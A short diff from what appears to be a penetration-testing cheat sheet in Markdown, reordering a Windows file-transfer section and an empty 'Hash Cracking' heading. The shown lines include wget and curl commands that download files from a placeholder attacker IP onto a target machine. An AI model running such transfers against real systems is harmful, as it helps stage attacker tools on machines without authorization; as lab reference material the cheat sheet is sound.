@@ -507,17 +507,17 @@ wget http://<attacker-ip>/<file>
 
 </details>
 
-# Hash Cracking
-
-<details> <summary><strong>Finding Hash Type</strong></summary>
-
-</details>
-
 <details> <summary><strong>Windows</strong></summary>
 
 ```bash
 curl http://<attacker-ip>/<file> -o <output_file>
 ```
+
+</details>
+
+# Hash Cracking
+
+<details> <summary><strong>Finding Hash Type</strong></summary>
 
 </details>
 
